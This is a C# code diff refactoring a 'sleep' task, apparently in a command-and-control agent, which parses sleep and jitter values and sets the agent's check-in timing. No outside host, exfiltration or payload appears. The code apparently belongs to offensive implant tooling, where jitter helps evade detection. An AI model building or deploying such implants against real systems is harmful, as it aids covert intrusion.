@@ -22,40 +22,41 @@ namespace Tasks
         {
         }
 
-        public override ST.Task CreateTasking()
-        {
-            return new ST.Task(() =>
-            {
-                TaskResponse resp;
-                string[] parts = _data.Parameters.Split(' ');
-                int sleepTime = -1;
-                double jitterTime = -1;
-                if (int.TryParse(parts[0], out sleepTime))
-                {
-                    if (parts.Length > 1 && double.TryParse(parts[1], out jitterTime))
-                    {
-                        resp = CreateTaskResponse("", true);
-                    } else
-                    {
-                        resp = CreateTaskResponse("", true);
-                    }
-                } else
-                {
-                    resp = CreateTaskResponse($"Failed to parse int from {parts[0]}.", true, "error");
-                }
 
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-                if (sleepTime >= 0)
+        public override void Start()
+        {
+            TaskResponse resp;
+            string[] parts = _data.Parameters.Split(' ');
+            int sleepTime = -1;
+            double jitterTime = -1;
+            if (int.TryParse(parts[0], out sleepTime))
+            {
+                if (parts.Length > 1 && double.TryParse(parts[1], out jitterTime))
                 {
-                    if (jitterTime >= 0)
-                    {
-                        _agent.SetSleep(sleepTime, jitterTime);
-                    } else
-                    {
-                        _agent.SetSleep(sleepTime);
-                    }
+                    resp = CreateTaskResponse("", true);
                 }
-            }, _cancellationToken.Token);
+                else
+                {
+                    resp = CreateTaskResponse("", true);
+                }
+            }
+            else
+            {
+                resp = CreateTaskResponse($"Failed to parse int from {parts[0]}.", true, "error");
+            }
+
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+            if (sleepTime >= 0)
+            {
+                if (jitterTime >= 0)
+                {
+                    _agent.SetSleep(sleepTime, jitterTime);
+                }
+                else
+                {
+                    _agent.SetSleep(sleepTime);
+                }
+            }
         }
     }
 }
